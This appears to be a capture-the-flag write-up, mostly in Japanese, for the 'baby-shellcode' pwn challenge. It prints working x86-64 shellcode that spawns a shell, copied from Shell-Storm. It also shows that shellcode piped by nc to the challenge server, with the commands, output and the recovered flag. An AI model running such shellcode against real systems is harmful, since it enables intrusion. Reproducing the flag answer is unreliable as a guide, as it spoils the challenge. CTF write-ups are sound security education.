# baby-shellcode:Pwn:159pts
This challenge is a test to see if you know how to write programs that machines can understand.  
Oh, you know how to code?  
Write some code into this program, and the program will run it for you.  
What programming language, you ask? Well... I said it's the language that machines can understand.  

`nc 34.28.147.7 5000`  
[baby-shellcode](baby-shellcode)  

# Solution
次はshellcodeのようだ。  
```bash
$ ./baby-shellcode
a
Illegal instruction
```
実行するとどうやら入力したshellcodeを実行するようだ。  
[Shell-Storm](https://shell-storm.org/shellcode/files/shellcode-806.html)からshellcodeを借りてくる。  
```bash
$ (echo -e '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05';cat) | ./baby-shellcode
whoami
satoki
```
リモートへ試す。  
```bash
$ (echo -e '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05';cat) | nc 34.28.147.7 5000
id
uid=1000 gid=1000 groups=1000
ls
flag
run
cat flag
uoftctf{arbitrary_machine_code_execution}
```
shellcodeが実行でき、flagを読み取れた。  

## uoftctf{arbitrary_machine_code_execution}